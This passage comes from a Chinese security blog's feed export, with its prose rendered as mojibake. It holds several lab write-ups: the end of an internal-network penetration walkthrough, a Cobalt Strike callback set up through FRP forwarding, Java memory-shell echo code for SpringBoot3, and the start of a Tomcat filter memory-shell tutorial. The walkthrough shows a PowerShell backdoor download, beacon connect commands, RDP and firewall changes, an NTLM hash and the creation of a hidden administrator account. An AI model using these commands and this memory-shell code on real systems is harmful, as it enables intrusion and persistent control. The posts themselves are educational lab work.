<p>å› ä¸ºServer2016æœ‰webæœåŠ¡ï¼ŒServer2016å’Œ2019èƒ½é€šä¿¡ï¼Œç›´æ¥ä¸Šä¼ åé—¨</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902223029810.png" alt="image-20240902223029810"></p>
<p>Server2019ä¸‹è½½åé—¨<code>powershell (new-object System.Net.WebClient).DownloadFile(&#39;http://10.0.10.111/Z.exe&#39;,&#39;C:\Z.exe&#39;)</code></p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902223727949.png" alt="image-20240902223727949"></p>
<p>Server2016 Beaconä¸»åŠ¨è¿æ¥ä¸€ä¸‹<code>shell connect 10.0.10.110 4444</code></p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902223803004.png" alt="image-20240902223803004"></p>
<h2 id="è¿œç¨‹æ¡Œé¢è¿æ¥"><a href="#è¿œç¨‹æ¡Œé¢è¿æ¥" class="headerlink" title="è¿œç¨‹æ¡Œé¢è¿æ¥"></a>è¿œç¨‹æ¡Œé¢è¿æ¥</h2><p>è®¾ç½®ä¸€ä¸‹SOCKS ä»£ç†</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902212438602.png" alt="image-20240902212438602"></p>
<p>å¼€å¯è¿œç¨‹ç™»å½•ï¼Œé˜²ç«å¢™å…è®¸TCPé€šä¿¡3389</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">wmic RDTOGGLE WHERE <span class="hljs-attribute">ServerName</span>=<span class="hljs-string">&#x27;%COMPUTERNAME%&#x27;</span> call SetAllowTSConnections 1<br><br>netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-built_in">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Remote Desktop&quot;</span> <span class="hljs-attribute">protocol</span>=TCP <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">localport</span>=3389 <span class="hljs-attribute">action</span>=allow<br><br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902225853099.png" alt="image-20240902225853099"></p>
<p>å¯†é’¥çš„è¯å¯ä»¥ç”¨åˆšåˆšè·å¾—<code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15:::</code>ç ´è§£ä¸€ä¸‹</p>
<p>æˆ–è€…æ·»åŠ ä¸€ä¸ªç®¡ç†å‘˜ç”¨æˆ·</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><code class="hljs crmsh"><span class="hljs-comment"># æ·»åŠ ç”¨æˆ·</span><br>net <span class="hljs-keyword">user</span> <span class="hljs-title">hack</span> user123.com /add<br><span class="hljs-comment"># æ·»åŠ åˆ°ç®¡ç†å‘˜ç»„</span><br>net localgroup administrators hack /add<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902225250187.png" alt="image-20240902225250187"></p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902225526376.png" alt="image-20240902225526376"></p>
<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>è¿™å¥—é¶æœºä¸»è¦è€ƒéªŒï¼Œæ­£ã€åå‘è¿æ¥ä¹‹é—´ä¸é˜²ç«å¢™çš„å…³ç³»ï¼›socksä»£ç†ï¼›æ¯”è¾ƒçŸ¥åçš„æ¼æ´æ°¸æ’ä¹‹è“ã€CVE-2020-1472çš„åˆ©ç”¨æ–¹å¼ï¼›ä»¥åŠä¸€äº›å†…ç½‘å¸¸ç”¨çš„å‘½ä»¤ã€‚</p>
<h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><p><a href="https://forum.butian.net/share/1832">çœ‹æˆ‘ç”¨å†…ç½‘MSFæ‰“å…¬ç½‘æ°¸æ’ä¹‹è“</a></p>
]]></content>
      <categories>
        <category>å†…ç½‘å®‰å…¨</category>
      </categories>
      <tags>
        <tag>å†…ç½‘é¶åœºæ¸—é€å®æˆ˜</tag>
      </tags>
  </entry>
  <entry>
    <title>ç”¨FRPå®ç°Cobalt Strikeæœ¬åœ°ä¸Šçº¿</title>
    <url>/2024/07/03/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%88%A9%E7%94%A8FRP%E5%AE%9E%E7%8E%B0cobalt%20strike%E6%9C%AC%E5%9C%B0%E4%B8%8A%E7%BA%BF/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å¦‚æœå°†Cobalt Strikeéƒ¨ç½²åœ¨VPSä¸Šï¼Œé•¿æœŸä½¿ç”¨VPSä¼šè¢«æ ‡è®°ã€‚å¦å¤–ï¼Œå¤§å®¶ä½¿ç”¨çš„ä¸€èˆ¬æ˜¯ç ´è§£ç‰ˆï¼Œä¸èƒ½ç¡®ä¿æ²¡æœ‰åé—¨ä¹‹ç±»çš„ä¸œè¥¿ã€‚é‚£å¯ä»¥å°†CSéƒ¨ç½²åœ¨è™šæ‹Ÿæœºé‡Œï¼Œåˆ©ç”¨FRPè½¬å‘ä¸Šçº¿ã€‚</p>
<p>æ¯”å¦‚ç°åœ¨æœ‰ä¸‰ä¸ªè§’è‰²ï¼šå…¬ç½‘æœåŠ¡å™¨ï¼š41.24.10.40      CSæœåŠ¡å™¨ï¼š192.168.73.98ï¼ˆè™šæ‹Ÿæœºé‡Œï¼‰      é¶æœºï¼š192.168.112.130(å¯ä»¥è®¿é—®å…¬ç½‘)</p>
<h2 id="å®ç°æ­¥éª¤"><a href="#å®ç°æ­¥éª¤" class="headerlink" title="å®ç°æ­¥éª¤"></a>å®ç°æ­¥éª¤</h2><p>åœ¨å…¬ç½‘æœåŠ¡å™¨ä¸Šfrpç»‘å®šç«¯å£7000</p>
<p><img src="https://image.sp4rks.xyz/2024/07/image-20240703205441550.png" alt="image-20240703205441550"></p>
<p>CSæœåŠ¡å™¨çš„FRPé…ç½®</p>
<p><img src="https://image.sp4rks.xyz/2024/07/image-20240703211315532.png" alt="image-20240703211315532"></p>
<p>CSç”Ÿæˆç›‘å¬å™¨é€‰æ‹©å…¬ç½‘æœåŠ¡å™¨çš„åœ°å€</p>
<p><img src="https://image.sp4rks.xyz/2024/07/image-20240703205751820.png" alt="image-20240703205751820"></p>
<p>CSæœåŠ¡å™¨æ˜¯å†…ç½‘æœºå™¨ï¼ˆ<code>192.168.73.98</code>ï¼‰ï¼Œå®ƒè¿è¡Œäº†ä¸€ä¸ªæœ¨é©¬ç¨‹åºï¼Œåœ¨ <code>6000</code> ç«¯å£ä¸Šç›‘å¬ã€‚ä½†æ˜¯è¿™å°å†…ç½‘æœºå™¨æ— æ³•ç›´æ¥ä»å…¬ç½‘è®¿é—®ã€‚</p>
<p>é€šè¿‡é…ç½®è¿™ä¸ªFRPå®¢æˆ·ç«¯ï¼Œå®ƒä¼šå°†æœ¬åœ° <code>192.168.73.98:6000</code> çš„TCPæµé‡è½¬å‘åˆ°å…¬ç½‘ä¸Šçš„FRPæœåŠ¡å™¨ (<code>41.24.10.40:7000</code>)ã€‚FRPæœåŠ¡å™¨ä¼šå°†è¿™ä¸ªæµé‡è½¬å‘åˆ°å…¬ç½‘çš„ <code>6000</code> ç«¯å£ï¼Œå› æ­¤ï¼Œå¤–éƒ¨ç½‘ç»œå¯ä»¥é€šè¿‡è®¿é—® <code>41.24.10.40:6000</code> æ¥è®¿é—®å†…ç½‘ä¸­è¿è¡Œçš„æœ¨é©¬ç¨‹åºã€‚</p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>çœ‹å°è¿ªçš„è§†é¢‘ï¼Œä»–çš„æ“ä½œæ˜¯ï¼šCSæœåŠ¡å™¨çš„FRPé…ç½®ä¸­ï¼Œæœ¬åœ°ç«¯å£ä¸å…¬ç½‘æœåŠ¡å™¨ç«¯å£ä¸ä¸€æ ·ï¼Œç„¶åç”¨CSç”Ÿæˆä¸¤ä¸ªç›‘å¬å™¨ï¼Œä¸€ä¸ªæ˜¯CSæœåŠ¡å™¨çš„IP+å®ƒæœ¬åœ°ç«¯å£ï¼›å¦ä¸€ä¸ªæ˜¯è¿œç¨‹æœåŠ¡å™¨IP+å…¬ç½‘æœåŠ¡å™¨ç«¯å£ï¼Œç”Ÿæˆæœ¨é©¬ç”¨è¿œç¨‹æœåŠ¡å™¨IP+å…¬ç½‘æœåŠ¡å™¨ç«¯å£è¿™ä¸ªç›‘å¬å™¨ã€‚ä»–æˆåŠŸäº†ä¸Šçº¿äº†ï¼Œæˆ‘æ­»æ´»ä¸æˆåŠŸã€‚æˆ‘è¿˜ä»¥ä¸ºCSé—®é¢˜ï¼Œé˜²ç«å¢™é—®é¢˜ï¼Œé©¬å„¿çš„é—®é¢˜ï¼Œæ€€ç–‘å„ç§é—®é¢˜ï¼Œåæ­£æ²¡æ€€ç–‘ä»–è§†é¢‘ã€‚ç„¶åä»æ˜¨å¤©æåˆ°ä»Šå¤©ï¼Œåæ­£ä¸å˜»å˜» :r</p>
]]></content>
      <categories>
        <category>å†…ç½‘å®‰å…¨</category>
      </categories>
      <tags>
        <tag>å†…ç½‘å®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot3Ã—java21ä¸‹ThreadLocal Responseå›æ˜¾</title>
    <url>/2024/08/18/JAVA%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/SpringBoot3%C3%97java21%E4%B8%8BThreadLocal%20Response%E5%9B%9E%E6%98%BE/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‰å‡ å¤©çœ‹äº†popå¸ˆå‚…çš„<a href="https://boogipop.com/2023/03/02/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/">Tomcatå†…å­˜é©¬å›æ˜¾æŠ€æœ¯</a>,åˆ©ç”¨ThreadLocal Responseå›æ˜¾çš„æ—¶å€™ï¼Œä»–æ¢æˆä½ç‰ˆæœ¬çš„SpringBootå’ŒJavaç‰ˆæœ¬äº†(å…¶å®ä¹Ÿå°±æ˜¯kingkkå¸ˆå‚…æå‡ºçš„tomcatå›æ˜¾å¾—çš„æ–¹æ³•)ã€‚å› ä¸ºç°åœ¨SpringBoot3æœ€ä½ä½¿ç”¨java17,åå°„ä¿®æ”¹private static finalçš„æ–¹æ³•åœ¨é«˜ç‰ˆæœ¬ä¸‹å·²ç»å¤±æ•ˆäº†ã€‚æ‰€ä»¥ä¹‹å‰çš„ä»£ç å·²ç»ä¸é€‚ç”¨äº†ï¼Œäºæ˜¯æˆ‘å°±æƒ³ç€èƒ½ä¸èƒ½åœ¨springboot3å’Œjava21å®ç°ä¸€æ ·çš„åŠŸèƒ½ï¼Œåˆšå¼€å§‹è‡ªå·±æ²¡æœ‰æ„é€ å‡ºæ¥ï¼Œåœ¨ABUå¸ˆå‚…çš„å¸®åŠ©ä¸‹æ‰å†™å‡ºæ¥ï¼Œäºæ˜¯ä¹Ÿå°±æœ‰äº†è¿™ç¯‡æ–‡ç« ã€‚ä¸»è¦æ˜¯è®°å½•è‡ªå·±å­¦ä¹ çš„è¿‡ç¨‹ã€‚</p>
<h1 id="ThreadLocal-Responseå›æ˜¾"><a href="#ThreadLocal-Responseå›æ˜¾" class="headerlink" title="ThreadLocal Responseå›æ˜¾"></a>ThreadLocal Responseå›æ˜¾</h1><p>ä½ç‰ˆæœ¬ä¸‹å°±ä¸å¤šèµ˜è¿°è¯´äº†ï¼Œå¯ä»¥çœ‹popå¸ˆå‚…çš„æ–‡ç« ï¼Œè¿™é‡Œä¸»è¦ä»‹ç»é«˜ç‰ˆæœ¬ä¸‹å¦‚ä½•è§£å†³æŠ¥é”™é—®é¢˜</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.echon;<br><br><span class="hljs-keyword">import</span> jakarta.servlet.ServletRequest;<br><span class="hljs-keyword">import</span> jakarta.servlet.ServletResponse;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardContext;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EchoShell</span> &#123;<br>    <span class="hljs-comment">//è·å–unSafeå¯¹è±¡ï¼Œå› ä¸ºUnsafeç±»ä¸­æ°å¥½å¯ä»¥ä¿®æ”¹åç§»é‡</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Unsafe <span class="hljs-title function_">getUnsafe</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">unsafeField</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        unsafeField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">return</span> (Unsafe) unsafeField.get(<span class="hljs-literal">null</span>);<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFinalStatic</span><span class="hljs-params">(Unsafe unsafe, Field field, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">fieldBase</span> <span class="hljs-operator">=</span> unsafe.staticFieldBase(field);<br>            <span class="hljs-type">long</span> <span class="hljs-variable">fieldOffset</span> <span class="hljs-operator">=</span> unsafe.staticFieldOffset(field);<br>            unsafe.putObject(fieldBase, fieldOffset, value);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDispatcherWrapsSameObjectTrue</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> Thread.currentThread();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getSuperclass().getDeclaredField(<span class="hljs-string">&quot;contextClassLoader&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        obj = field.get(obj);<br><br>        field = obj.getClass().getSuperclass().getSuperclass().getDeclaredField(<span class="hljs-string">&quot;resources&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        obj = field.get(obj);<br><br>        field = obj.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) field.get(obj);<br>        standardContext.setDispatcherWrapsSameObject(<span class="hljs-literal">true</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(&quot;/shell&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> getUnsafe();<br><br>        <span class="hljs-comment">//è·å–å½“å‰çš„ç±», é€šè¿‡ Unsafe ä¿®æ”¹ Class çš„æ¨¡å—ï¼š</span><br>        Module baseModule=Object.class.getModule();<br>        Class&lt;?&gt; currentClass= EchoShell.class;<br>        <span class="hljs-type">long</span> addr=unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="hljs-string">&quot;module&quot;</span>));<br>        unsafe.getAndSetObject(currentClass,addr,baseModule);<br><br>        <span class="hljs-comment">// è·å– ApplicationFilterChain çš„ç§æœ‰å­—æ®µ</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">lastServicedRequestField</span> <span class="hljs-operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="hljs-string">&quot;lastServicedRequest&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">lastServicedResponseField</span> <span class="hljs-operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="hljs-string">&quot;lastServicedResponse&quot;</span>);<br><br>        <span class="hljs-comment">// è®¾ç½®å­—æ®µå¯è®¿é—®</span><br>        lastServicedRequestField.setAccessible(<span class="hljs-literal">true</span>);<br>        lastServicedResponseField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-comment">// è·å– lastServicedRequest å’Œ lastServicedResponse å˜é‡</span><br>        ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(<span class="hljs-literal">null</span>);<br>        ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(<span class="hljs-literal">null</span>);<br><br><br>        <span class="hljs-comment">// ä¿®æ”¹ dispatcherWrapsSameObject çš„å€¼ä¸º true</span><br>        setDispatcherWrapsSameObjectTrue();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> lastServicedRequest.get() != <span class="hljs-literal">null</span><br>                ? lastServicedRequest.get().getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)<br>                : <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">if</span> (lastServicedResponse.get() == <span class="hljs-literal">null</span> || lastServicedRequest.get() == <span class="hljs-literal">null</span>) &#123;<br>            System.out.println(<span class="hljs-string">&quot;in&quot;</span>);<br>            <span class="hljs-comment">//åå°„ä¿®æ”¹private static final ä¿®é¥°çš„lastServicedRequestå’ŒlastServicedResponse</span><br>            setFinalStatic(unsafe, lastServicedRequestField, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;&gt;());<br>            setFinalStatic(unsafe, lastServicedResponseField, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;&gt;());<br><br>        &#125;<span class="hljs-keyword">if</span>(cmd!=<span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">try</span>&#123;<br>                <span class="hljs-type">ServletResponse</span> <span class="hljs-variable">responseFacade</span> <span class="hljs-operator">=</span> lastServicedResponse.get();<br>                System.out.println(responseFacade);<br>            &#125;<span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br><br><br><br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/08/image-20240818151142566.png" alt="image-20240818151142566"></p>
<p>å…¶å®ä¸»è¦è§£å†³äº†ä¸¤ä¸ªé—®é¢˜</p>
<ol>
<li>åå°„ä¿®æ”¹private static finalçš„æ–¹æ³•åœ¨é«˜ç‰ˆæœ¬ä¸‹å·²ç»å¤±æ•ˆã€‚</li>
<li>å¦‚ä½•ä¿®æ”¹dispatcherWrapsSameObjectå€¼ä¸ºtrueçš„é—®é¢˜ã€‚</li>
</ol>
<h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><p><a href="https://xz.aliyun.com/t/7348?time__1311=n4+xnD0Dy7=Yq0KitD/iW+RxIr4vDBADWweYID#toc-3">Tomcatä¸­ä¸€ç§åŠé€šç”¨å›æ˜¾æ–¹æ³•</a></p>
<p> <a href="https://www.cnblogs.com/cnsevennight/p/17446891.html">JDKé«˜ç‰ˆæœ¬åå°„ä¿®æ”¹ private static fianl ä¿®é¥°çš„å¯¹è±¡</a></p>
<p><a href="https://boogipop.com/2023/03/02/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/">Tomcatå†…å­˜é©¬å›æ˜¾æŠ€æœ¯</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVAå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat Servlet-apiå†…å­˜é©¬#Filterå‹</title>
    <url>/2024/08/06/JAVA%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Filter%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ç½‘ä¸Šæ–‡ç« éƒ½æ˜¯filterå·²ç»åˆ›å»ºå¥½äº†ï¼Œç„¶åå…³æ³¨åˆ›å»ºè¿‡ç¨‹ä¸­éœ€è¦çš„å…³é”®å‚æ•°ã€‚</p>
<p>ç»„é•¿çš„è§†é¢‘æ€è·¯æ›´åå‘äºfilterçš„åˆ›å»ºè¿‡ç¨‹ã€‚è¿™ç¯‡æ–‡ç« åŸºäºç»„é•¿çš„æ€è·¯ç¼–å†™ã€‚</p>
<h1 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h1><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Tomcat8-Servlet<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Tomcat8-Servlet<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">packaging</span>&gt;</span>war<span class="hljs-tag">&lt;/<span class="hljs-name">packaging</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">junit.version</span>&gt;</span>5.9.2<span class="hljs-tag">&lt;/<span class="hljs-name">junit.version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javax.servlet-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.junit.jupiter<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit-jupiter-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>$&#123;junit.version&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.junit.jupiter<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit-jupiter-engine<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>$&#123;junit.version&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.100<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>        //è¿™é‡Œæ›¿æ¢ä¸ºè‡ªå·±çš„ç‰ˆæœ¬<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-war-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.3.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>(tomcatçš„æ ¸å¿ƒå°±æ˜¯catalinaï¼Œä¸å¯¼å…¥å®ƒå¾ˆå¤šæ–‡ä»¶æ‰¾ä¸åˆ°)</p>
